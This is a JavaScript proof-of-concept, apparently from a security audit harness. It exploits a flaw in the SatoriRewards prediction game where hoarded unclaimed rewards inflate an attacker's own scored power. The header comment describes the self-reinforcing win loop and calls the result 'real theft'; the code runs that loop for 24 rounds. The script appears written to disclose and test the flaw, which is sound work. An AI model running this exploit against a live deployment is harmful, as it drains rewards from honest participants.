// FINDING (surface A — the new deployedPower metric): CLAIRVOYANCE on the default
// game for a half-supply actor, needing no sign-steering at all.
//
// The default (ABC) game scores a round-R prediction on sign(dp[R+1] - dp[R]),
// where dp[round] = Σ predictors' full prediction power that round, and
// prediction power = balance + UNCLAIMED rewards (SatoriRewards.getPredictionPower).
//
// Exploit: predict UP on the default game every round and NEVER claim. Each win
// credits unclaimed rewards, which are counted as prediction power immediately
// but are NOT yet in totalSupply. So my own deployed power STRICTLY GROWS every
// round I win. That growth alone forces dp[R+1] > dp[R], which makes the next UP
// prediction win too — a self-reinforcing loop. I hold ~half the supply, so my
// contribution dominates the honest field's round-to-round drift. Result: a
// sustained ~100% win-rate while net-extracting SATORI (the default game's whole
// derived pool each round). I literally CONTROL the value my prediction is scored
// against, via my own hoarded, supply-excluded power. Clairvoyance + real theft.
module.exports = async ({ world, tools, ethers, log }) => {
  const DEFAULT_GAME = 1, UP = 1;
  const rewards = world.fix.rewards, token = world.fix.token, A = world.attacker.address;
  const ratio = async () => Number(((await rewards.getPredictionPower(A)) * 10000n) / (await token.totalSupply())) / 10000;

  log({ tag: "start", powerRatio: await ratio(), unclaimed: (await rewards.unclaimedRewards(A)).toString() });

  for (let i = 0; i < 24; i++) {
    // Predict UP; never claim -> unclaimed compounds -> my deployed power rises
    // -> dp[R+1] > dp[R] -> this UP prediction is correct.
    try { await tools.predict.run({ gameId: DEFAULT_GAME, dir: UP }); }
    catch (e) { log({ i, predictErr: e.message }); }
    await tools.advance_time.run({ hours: 24 });
    // Settle the prior round's UP prediction (auto-scored too, but be explicit).
    try { await tools.settle.run({ gameId: DEFAULT_GAME }); } catch (e) {}
  }
  // Let the last two predictions mature, then settle.
  await tools.advance_time.run({ hours: 24 });
  await tools.advance_time.run({ hours: 24 });
  try { await tools.settle.run({ gameId: DEFAULT_GAME }); } catch (e) {}

  log({ tag: "end", powerRatio: await ratio(), unclaimed: (await rewards.unclaimedRewards(A)).toString() });
};
